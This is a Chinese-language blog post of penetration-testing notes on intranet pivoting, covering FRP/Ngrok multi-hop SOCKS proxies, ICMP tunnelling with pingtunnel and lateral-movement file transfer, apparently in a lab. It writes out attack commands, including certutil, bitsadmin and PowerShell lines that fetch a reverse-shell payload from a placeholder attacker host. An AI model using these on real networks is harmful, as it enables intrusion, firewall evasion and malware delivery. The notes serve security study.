+<h5 id="内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="内网穿透Ngrok测试演示-两个内网通讯上线"></a>内网穿透Ngrok测试演示-两个内网通讯上线</h5><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304154406960.png"
+                      alt="image-20230304154406960"
+                ></p>
+<p>试想以下两个内网中，互补相通该怎么交换数据？？</p>
+<p>能想到的是交给一个中间人帮忙传递，这就跟代理类似，利用一个云主机做代理帮助两个内网主机传递数据</p>
+<p>由于没有ngrok，这里引用别人的笔记</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304205653387.png"
+                      alt="image-20230304205653387" style="zoom:150%;" 
+                >
+
+<p>kali作为控制端，运行ngrok的客户端，并且利用msf生成后门文件进行上传来实现反弹shell，利用的是代理服务器的中转功能</p>
+<p>这个后门文件主要是将内网靶机的shell发送至代理服务器，然后再由代理服务器反弹shell至外网攻击机</p>
+<p>主要步骤：攻击机连接代理服务器—-&gt;msf生成一个后门文件植入靶机（收集的信息发送至代理服务器）—-&gt;代理服务器又将信息反弹至攻击机</p>
+<h6 id="内网穿透Frp自建跳板测试-两个内网通讯上线"><a href="#内网穿透Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="内网穿透Frp自建跳板测试-两个内网通讯上线"></a>内网穿透Frp自建跳板测试-两个内网通讯上线</h6><p>Frp是现在比较主流的工具，分为服务端（中转的服务器）和控制端（攻击机和靶机）</p>
+<p>FRP下载地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases" >https://github.com/fatedier/frp/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p>服务端：下载-解压-修改-启动（对于阿里云主机要修改安全组配置出入口）</p>
+<p>将下载好的包上传到服务器，并且解压frp包</p>
+<h6 id="实战环境"><a href="#实战环境" class="headerlink" title="实战环境"></a>实战环境</h6><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230313081434957.png"
+                      alt="image-20230313081432510"
+                ></p>
+<p>网络一级代理</p>
+<p>已经获得win server 2012的控制权，需要继续登陆FTP服务器</p>
+<p>1.利用VPS作为FRP的服务端，执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></table></figure></div>
+
+<p>配置frps.ini文件如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0         服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000            服务端绑定的端口</span><br></pre></td></tr></table></figure></div>
+
+<p>2.win server 2012作为客户端，执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></table></figure></div>
+
+<p>客户端文件frpc.ini配置如下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1000            代理所使用的端口，会被转发到服务端</span><br><span class="line">plugin = socks5               代理的类型</span><br></pre></td></tr></table></figure></div>
+
+<p>至此输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh root@10.10.10.15      便可成功登入FTP服务器</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>二级网络代理</p>
+<p>同样先VPS作为服务端，启动</p>
+<p>win server2012作为客户端启动</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_ip = 10.10.10.13        本地的IP地址</span><br><span class="line">local_port = 10808            客户端要转发的端口</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在win server2012再开启服务端，运行</p>
+<p><code>	./frps.exe -c ./frps.ini</code></p>
+<p>配置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13         win服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000                win服务端绑定的端口</span><br></pre></td></tr></table></figure></div>
+
+<p>在dmz的FTP服务器上开启</p>
+<p><code>	./frpc.exe -c ./frpc.ini</code></p>
+<p>配置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.113     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br><span class="line">plugin = socks5               代理类型</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在ProxyChains配置文件最后一行添加“socks5 192.168.2.138 1080”执行</p>
+<p><code>	proxychains rdesktop 192.168.30.20</code>	</p>
+<p>即可访问办公区的远程桌面</p>
+<p>三级网络代理</p>
+<p>先是vps服务端启动，然后win server2012客户端，win server2012服务端，FTP客户端</p>
+<p>FTP客户端配置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13    服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_ip = 192.168.30.40      本地的IP地址</span><br><span class="line">local_port = 10809            客户端要转发的端口</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br></pre></td></tr></table></figure></div>
+
+<p>然后FTP启动服务端</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></table></figure></div>
+
+<p>配置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40         FTP服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000                  FTP服务端绑定的端口</span><br></pre></td></tr></table></figure></div>
+
+<p>在办公区文件服务器上执行</p>
+<p><code>	./frpc.exe -c ./frpc.ini</code></p>
+<p>配置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40    服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_port = 10809            客户端要转发的端口</span><br><span class="line">plugin = socks5               代理类型</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在ProxyChains配置文件最后一行添加“socks5 192.168.2.138 1080”执行</p>
+<p><code>	proxychains rdesktop 192.168.60.10</code>	</p>
+<p>即可连接远程桌面</p>
+<h4 id="域横向网络-amp-传输-amp-应用层隧道技术"><a href="#域横向网络-amp-传输-amp-应用层隧道技术" class="headerlink" title="域横向网络&amp;传输&amp;应用层隧道技术"></a>域横向网络&amp;传输&amp;应用层隧道技术</h4><p>隧道技术是为了解决：防火墙过滤问题  网络连接通信问题  数据回链封装问题</p>
+<p>在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。</p>
+<p>如：CS MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信讯在问题等问题，都可以通过隧道技术解决。</p>
+<h6 id="隧道技术前期的必备条件"><a href="#隧道技术前期的必备条件" class="headerlink" title="隧道技术前期的必备条件"></a>隧道技术前期的必备条件</h6><p>在用隧道之前要先探测对应隧道协议是否支持，如果不支持用这个隧道也没有用</p>
+<h6 id="隧道原理"><a href="#隧道原理" class="headerlink" title="隧道原理"></a>隧道原理</h6><p>在实际的网络中，通常是用各种边界设备、软硬件防火墙以及入侵检测系统，隧道是指绕过端口屏蔽的通信方式</p>
+<p>将数据包两端进行防火墙允许的方式封装，然后就可以穿过防火墙，进行通信，当数据包达到目的地时将数据包还原，并将还原后的数据包发送到相应的服务器上。</p>
+<p>常用的隧道技术有以下三种：</p>
+<p>网络层：ipv6隧道、ICMP隧道（伪造这个协议）</p>
+<p>传输层：TCP隧道、UDP隧道、常用端口转发</p>
+<p>应用层：SSH隧道、HTTP&#x2F;S隧道、DNS隧道</p>
+<h6 id="网络应用层连通性检测"><a href="#网络应用层连通性检测" class="headerlink" title="网络应用层连通性检测"></a>网络应用层连通性检测</h6><p>可以建立各种层面的隧道，每个层面又有不同的协议，你得先确定支持哪个隧道协议，才能确定你要用那个隧道。</p>
+<p>比如：一个网络层的icmp隧道，要检测是否支持ICMP就可以用ping检测目标主机，ping通就可以得到该主机支持ICMP协议。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/a3dd3b49072dc8442835ab5947bebe8a50d5d72d.png@768w_200h_progressive.webp"
+                      alt="img"
+                ></p>
+<h6 id="检测TCP协议（瑞士军刀：netcat）"><a href="#检测TCP协议（瑞士军刀：netcat）" class="headerlink" title="检测TCP协议（瑞士军刀：netcat）"></a>检测TCP协议（瑞士军刀：netcat）</h6><p>执行nc 命令（-vz检测TCP端口）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vz &lt;IP&gt;&lt;端口&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i0.hdslb.com/bfs/article/78fbfd4cda509b0161d2ab1aafbc8dffc69b879b.png@831w_116h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>（-uz）检测UDP端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -uz &lt;IP&gt; &lt;端口&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/49ce79858b1b27fefef12131097dd8c2e955c9be.png@549w_140h_progressive.webp"
+                      alt="img"
+                ></p>
+<h6 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h6><p>如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
+<p>用“curl”工具，执行 curl &lt;IP 地址:端口&gt;命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6c4ad43e6393edc186d61fc76bf4b86a0dbfc287.png@831w_207h_progressive.webp"
+                      alt="img"
+                ></p>
+<h6 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h6><p>nslookup时win自带的命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7061afc7be4cbb13b3c590d995ecee433a05f10e.png@627w_324h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>dig时linux系统自带的命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e27d474e4b3cd57f169ec3d45168bf7b0c3be25.png@753w_132h_progressive.webp"
+                      alt="img"
+                ></p>
+<h6 id="pingtunnel工具的使用"><a href="#pingtunnel工具的使用" class="headerlink" title="pingtunnel工具的使用"></a>pingtunnel工具的使用</h6><p>pingtunnel的原理是把tcp&#x2F;udp&#x2F;sock5流量伪装icmp流量进行转发的工具</p>
+<p>语法：</p>
+<p>-p 表示连接 icmp 隧道另一端的机器IP（即目标服务器）</p>
+<p>-lp 表示需要监听的本地tcp端口</p>
+<p>-da指定需要转发的机器的IP（即目标内网某一机器的内网 IP）</p>
+<p>-dp指定需要转发的机器的端口（即目标内网某一机器的内网端口）</p>
+<p>-x设置连接的密码 </p>
+<h6 id="靶场分析"><a href="#靶场分析" class="headerlink" title="靶场分析"></a>靶场分析</h6><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/641c898428e69f32b54c85e1422075b383421816.png@831w_243h_progressive.webp"
+                      alt="img"
+                ></p>
+<p>现在有一台攻击机叫hanker  xiaodi（下面简称hx）要实现对一个内网环境的域控DC的控制，但是hx处于76.xx的IP网段是不能连接到33.33这个内网网段的，但是可以通过域内一台开放外网接口的主机webserver与DC连接。</p>
+<p>首先：</p>
+<p>webserver： .&#x2F;ptunnel -x xiaodi 先部署工具</p>
+<p>hx： .&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi</p>
+<p>转发3389端口的请求数据给本地的1080</p>
+<p>hx： rdesktop 127.0.0.1 1080</p>
+<h4 id="横向移动中的文件传输-1"><a href="#横向移动中的文件传输-1" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h4><p>该知识用于在取得权限之后，发送木马文件，进一步取得控制</p>
+<h6 id="通过网络共享-1"><a href="#通过网络共享-1" class="headerlink" title="通过网络共享"></a>通过网络共享</h6><h6 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h6><h6 id="通过windows自带工具"><a href="#通过windows自带工具" class="headerlink" title="通过windows自带工具"></a>通过windows自带工具</h6><p>certutil</p>
+<p>certutil时Windows自带的命令工具，提供从网络下载文件的功能，所以可以部署一个自己事先在可控服务器中的恶意文件即可实现攻击。</p>
+<p>执行：</p>
+<p><code>	certutil -urlcache -split -f http://IP:port/shell.exe C:/reverse_tcp.exe</code></p>
+<p>意思是通过certutil下载shell.exe，并保存在C:\reverse_top.exe</p>
+<p>BITSAdmin</p>
+<p>BITSAdmin是一个Windows命令行工具，可以用于创建、下载、上传作业，监视进度。win7以后自带</p>
+<p>命令：</p>
+<p><code>	bitsadmin /transfer test http://IP:Port/shell.exe C:\reverse_tcp.exe</code></p>
+<p>PowerShell</p>
+<p>可以通过创建WebClient对象来实现文件下载</p>
+<p><code>	（New-Object Net.WebClient）.DownloadFile(&#39;http://IP:Port/shell.exe&#39;,&#39;C:\reverse_tcp.exe&#39;)</code></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：内网安全</li>
+        <li>Post author：yuBetter</li>
+        <li>Create time：2023-04-14 21:31:48</li>
+        <li>
+            Post link：https://yubetter.github.io/2023/04/14/内网安全/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/04/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">权限提升</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/04/14/SSRF%E6%BC%8F%E6%B4%9E/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">SSRF漏洞</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">内网安全</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AE%A4%E7%9F%A5"><span class="nav-text">基本认知</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E6%8B%93%E6%89%91"><span class="nav-text">网站拓扑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%80%E5%9F%9F%E7%BD%91%E3%80%81%E5%B7%A5%E4%BD%9C%E7%BB%84%E3%80%81%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="nav-text">局域网、工作组、域环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8DC%E5%B0%B1%E6%98%AF%E6%89%80%E8%B0%93%E7%9A%84%E7%AE%A1%E7%90%86%E4%B8%BB%E6%9C%BA"><span class="nav-text">域控制器DC就是所谓的管理主机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95AD"><span class="nav-text">活动目录AD</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F"><span class="nav-text">域</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%AD%E6%8D%AE%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">凭据信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8Ewin%EF%BC%89%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">mimikatz（适用于win）的使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LaZagne%EF%BC%88all%EF%BC%89%EF%BC%8CXenArmor%EF%BC%88win%EF%BC%89"><span class="nav-text">LaZagne（all），XenArmor（win）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE%E6%9C%8D%E5%8A%A1%E5%8F%A3%E4%BB%A4%E8%8E%B7%E5%8F%96%EF%BC%88%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%EF%BC%89"><span class="nav-text">计算机各种协议服务口令获取（获取本地计算机的各种软件密码）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E6%8E%A2%E9%92%88"><span class="nav-text">后续探针</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E9%92%88%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%8F%8A%E5%9C%B0%E5%9D%80%E4%BF%A1%E6%81%AF"><span class="nav-text">探针域控制器及地址信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E9%92%88%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E5%8F%8A%E5%9C%B0%E5%9D%80%E4%BF%A1%E6%81%AF"><span class="nav-text">探针域内存活主机及地址信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#powershell%E8%84%9A%E6%9C%ACnishang%E5%B7%A5%E5%85%B7"><span class="nav-text">powershell脚本nishang工具</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-text">横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">横向移动中的文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB"><span class="nav-text">通过网络共享</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#IPC-%E5%85%B1%E4%BA%AB"><span class="nav-text">IPC$共享</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E6%90%AD%E5%BB%BASMB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">通过搭建SMB服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-text">通过Windows自带的工具</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Certutil"><span class="nav-text">Certutil</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#BITSAdmin"><span class="nav-text">BITSAdmin</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PowerShell"><span class="nav-text">PowerShell</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAC-Remote-Restrictions"><span class="nav-text">UAC Remote Restrictions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%88%A9%E7%94%A8"><span class="nav-text">远程桌面利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#RDP-Hijacking"><span class="nav-text">RDP Hijacking</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SharpRDP"><span class="nav-text">SharpRDP</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinRM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">WinRM的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="nav-text">执行远程命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8WinRM%E8%8E%B7%E5%8F%96%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%BC%9A%E8%AF%9D"><span class="nav-text">利用WinRM获取交互式会话</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#powershell%E5%88%A9%E7%94%A8"><span class="nav-text">powershell利用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Evil-Winrm"><span class="nav-text">Evil-Winrm</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat-amp-schtasks-amp-impacket"><span class="nav-text">域横向批量at&amp;schtasks&amp;impacket</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92at-amp-schtasks"><span class="nav-text">横向渗透明文传递at&amp;schtasks</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#at-lt-windows-2012"><span class="nav-text">at &lt; windows 2012</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#impacket"><span class="nav-text">impacket</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#UNC%E8%B7%AF%E5%BE%84%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C"><span class="nav-text">UNC路径加载执行</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WMI%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">WMI的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#winRM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">winRM的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#winrs"><span class="nav-text">winrs</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Winrm-cmd"><span class="nav-text">Winrm.cmd</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8"><span class="nav-text">系统服务利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="nav-text">创建远程服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%85%A8%E9%83%A8%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="nav-text">利用全部步骤：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#psexec-amp-smbexec%E4%BB%A5%E5%8F%8Awmic-amp-wmiexec"><span class="nav-text">psexec&amp;smbexec以及wmic&amp;wmiexec</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#procdump-mimikatz%E7%9A%84%E9%85%8D%E5%90%88%E8%8E%B7%E5%8F%96"><span class="nav-text">procdump+mimikatz的配合获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#hashcat%E7%A0%B4%E8%A7%A3NTLM-hash-kali%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%B8%A6"><span class="nav-text">hashcat破解NTLM hash(kali系统自带)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8smb%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8%E2%80%93psexec%EF%BC%8C%EF%BC%8Csmbexec%EF%BC%88%E5%AE%98%E6%96%B9%E8%87%AA%E5%B8%A6%EF%BC%89"><span class="nav-text">域横向移动smb服务利用–psexec，，smbexec（官方自带）</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#psexec"><span class="nav-text">psexec</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#smbexec%EF%BC%88%E6%97%A0%E9%9C%80%E5%85%88ipc%E8%BF%9E%E6%8E%A5-%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92%EF%BC%89"><span class="nav-text">smbexec（无需先ipc连接 